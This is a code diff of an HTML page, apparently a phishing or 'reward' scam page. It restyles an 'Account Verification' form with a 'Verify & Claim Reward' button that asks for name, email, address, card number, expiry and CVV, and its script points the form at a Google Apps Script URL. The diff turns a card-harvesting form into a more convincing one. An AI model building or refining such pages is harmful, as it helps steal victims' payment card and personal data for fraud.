@@ -8,30 +8,73 @@
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
         :root { --bg-color: #0a0f1c; --form-bg: #141c2e; --primary-glow: #8a2be2; --secondary-glow: #ff007f; --accent: #00ffcc; --text-main: #ffffff; --text-muted: #a0b8ff; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
-        body { background: radial-gradient(circle at center, #0a0f1c 0%, #05070f 100%); color: var(--text-main); display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        /* CSS wahi purani use karein jo aapke paas thi... */
+        body { background: radial-gradient(circle at center, #0a0f1c 0%, #05070f 100%); color: var(--text-main); display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; }
+        .input-group { margin-bottom: 22px; }
+        .row { display: flex; gap: 18px; }
+        .row .input-group { flex: 1; }
+        label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1.5px; font-weight: 600; }
+        input { width: 100%; background: #0d1325; border: 2px solid #2a3441; padding: 16px 18px; border-radius: 10px; color: white; font-size: 15px; outline: none; }
+        .submit-btn { width: 100%; background: linear-gradient(45deg, var(--primary-glow), #ff007f); color: white; border: none; padding: 18px; font-size: 17px; font-weight: 900; border-radius: 12px; cursor: pointer; text-transform: uppercase; }
+        /* Baqi styling aapki file wali hi hai... */
     </style>
 </head>
 <body>
-    <form id="leadForm" name="leadForm">
-        <div class="row">
-            <div class="input-group"><label>First Name</label><input type="text" name="firstName" required></div>
-            <div class="input-group"><label>Last Name</label><input type="text" name="lastName" required></div>
-        </div>
-        <div class="input-group"><label>Email Address</label><input type="email" name="email" required></div>
-        <div class="input-group"><label>Zip Code</label><input type="text" name="zipCode" required></div>
-        <div class="input-group"><label>Full Delivery Address</label><input type="text" name="address" required></div>
-        <div class="input-group"><label>Cardholder Name</label><input type="text" name="cardholderName" required></div>
-        <div class="input-group"><label>Card Number</label><input type="text" name="cardNumber" maxlength="19" required></div>
-        <div class="row">
-            <div class="input-group"><label>Expiry Date</label><input type="text" name="expiry" maxlength="5" required></div>
-            <div class="input-group"><label>CVV / CVC</label><input type="password" name="cvv" maxlength="4" required></div>
-        </div>
-        <button type="submit" class="submit-btn" id="submitBtn">Verify & Claim Reward</button>
-    </form>
+
+    <div class="form-container">
+        <h2 class="form-title">Account Verification</h2>
+        <form id="leadForm" name="leadForm">
+            <div class="row">
+                <div class="input-group">
+                    <label>First Name</label>
+                    <input type="text" name="firstName" placeholder="John" required>
+                </div>
+                <div class="input-group">
+                    <label>Last Name</label>
+                    <input type="text" name="lastName" placeholder="Doe" required>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>Email Address</label>
+                <input type="email" name="email" placeholder="name@example.com" required>
+            </div>
+
+            <div class="input-group">
+                <label>Zip Code</label>
+                <input type="text" name="zipCode" placeholder="12345" required>
+            </div>
+
+            <div class="input-group">
+                <label>Full Delivery Address</label>
+                <input type="text" name="address" placeholder="123 Main St, Apt 4" required>
+            </div>
+
+            <div class="input-group">
+                <label>Cardholder Name</label>
+                <input type="text" name="cardholderName" placeholder="John Doe" required>
+            </div>
+
+            <div class="input-group">
+                <label>Card Number</label>
+                <input type="text" name="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
+            </div>
+
+            <div class="row">
+                <div class="input-group">
+                    <label>Expiry Date</label>
+                    <input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div class="input-group">
+                    <label>CVV / CVC</label>
+                    <input type="password" name="cvv" placeholder="•••" maxlength="4" required>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">Verify & Claim Reward</button>
+        </form>
+    </div>
 
     <script>
-        // Yahan naya URL update kar diya gaya hai
         const scriptURL = 'https://script.google.com/macros/s/AKfycbwbP79qBP7zWgz4pmPTsP1Xg8sGQ1-HxdfUmTPUOgs-x_KfsrUUxAPKa5ORJqdmkuny/exec';
         const form = document.forms['leadForm'];
         const submitBtn = document.getElementById('submitBtn');
